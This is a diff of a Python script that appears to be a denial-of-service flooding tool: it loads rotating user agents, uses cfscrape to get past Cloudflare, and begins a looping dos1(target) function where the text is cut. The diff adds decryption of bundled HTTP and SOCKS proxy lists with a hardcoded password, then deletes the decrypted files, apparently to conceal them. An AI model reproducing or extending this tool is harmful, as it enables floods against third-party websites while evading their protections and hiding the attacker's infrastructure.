@@ -1,22 +1,44 @@
+import time
+
 import colorama
 import threading
 import random
 import requests
 import cfscrape
 import os
+import pyAesCrypt
 
 os.system("clear")
 
 s = cfscrape.create_scraper()
 
+#Получение User-Agent
 with open('useragent') as file:
     headersp = ''.join(file.readlines()).strip().split('\n')
 
+filedecrypthttp = "proxyhttp.crp"
+filedecryptsocks = "proxysocks.crp"
+password = "0xdrqdsdwgfegvefgtruoobcdsm"
+
+
+def decryptionhttp():
+    buffer_size = 512 * 1024
+    pyAesCrypt.decryptFile(str(filedecrypthttp), str(os.path.splitext(filedecrypthttp)[0]), password, buffer_size)
+decryptionhttp()
+
 with open('proxyhttp') as file:
     proxy_http = ''.join(file.readlines()).strip().split('\n')
+os.remove("proxyhttp")
+
+def decryptionsocks():
+    buffer_size = 512 * 1024
+    pyAesCrypt.decryptFile(str(filedecryptsocks), str(os.path.splitext(filedecryptsocks)[0]), password, buffer_size)
+decryptionsocks()
 
 with open('proxysocks') as file:
     proxy_socks = ''.join(file.readlines()).strip().split('\n')
+os.remove("proxysocks")
+
 
 def dos1(target):
     while True:
